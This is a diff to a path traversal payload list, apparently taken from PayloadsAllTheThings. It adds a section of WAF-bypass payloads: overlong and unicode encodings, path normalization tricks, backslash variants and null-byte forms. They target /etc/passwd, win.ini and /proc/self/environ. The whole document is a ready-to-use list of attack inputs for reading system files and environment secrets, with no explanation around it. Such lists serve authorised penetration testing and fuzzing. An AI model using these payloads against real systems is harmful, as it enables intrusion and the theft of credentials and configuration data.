@@ -1,6 +1,6 @@
 # Path/Directory Traversal payloads
 # Source: https://github.com/swisskyrepo/PayloadsAllTheThings
-# Total: 837 payloads
+# Total: 857 payloads
 ../../../etc/passwd
 ../../../../etc/passwd
 ../../../../../etc/passwd
@@ -840,3 +840,29 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 ..%2f..%2fetc%2fpasswd%00
 ..%c0%2f..%c0%2fetc/passwd
 ..%u2215..%u2215etc%u2215passwd
+
+# --- WAF bypass ---
+# overlong / unicode normalization
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+%c0%ae%c0%ae%c0%afetc%c0%afpasswd
+..%e0%80%ae..%e0%80%aeetc%e0%80%aepasswd
+..%uFF0F..%uFF0Fetc%uFF0Fpasswd
+..%252e%252e%252fetc%252fpasswd
+# path normalization tricks
+....//....//etc/passwd
+....///....///etc/passwd
+..//..//..//etc/passwd
+....\....\....\etc\passwd
+.%2e/.%2e/.%2e/etc/passwd
+%2e./%2e./%2e./etc/passwd
+..%3b/..%3b/..%3b/etc/passwd
+....%2f....%2f....%2fetc%2fpasswd
+# backslash variants
+..%5C..%5CWindows%5Cwin.ini
+%2e%2e%5c%2e%2e%5cetc%5cpasswd
+..\..\..\windows\win.ini
+# null-byte / encoded roots
+..%2f..%2f..%2fetc%2fpasswd%00.png
+/etc/passwd%00
+%2Fetc%2Fpasswd
+..%2f..%2f..%2fproc%2fself%2fenviron
